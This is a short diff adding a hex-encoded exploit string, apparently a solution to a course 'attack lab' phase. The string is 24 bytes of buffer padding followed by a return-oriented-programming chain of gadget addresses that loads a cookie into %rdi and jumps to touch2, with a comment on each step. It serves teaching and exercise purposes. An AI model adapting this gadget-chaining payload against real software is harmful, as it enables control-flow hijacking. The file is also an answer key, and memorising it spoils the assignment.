@@ -1,0 +1,12 @@
+/* 24 bytes of padding for buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* first gadget to popq %rax */
+2d 18 40 00 00 00 00 00
+/* my cookie */
+aa 73 fa 50 00 00 00 00
+/* second gadget to move %rax (cookie) into %rdi */
+35 18 40 00 00 00 00 00
+/* address of touch2 */
+a5 16 40 00 00 00 00 00
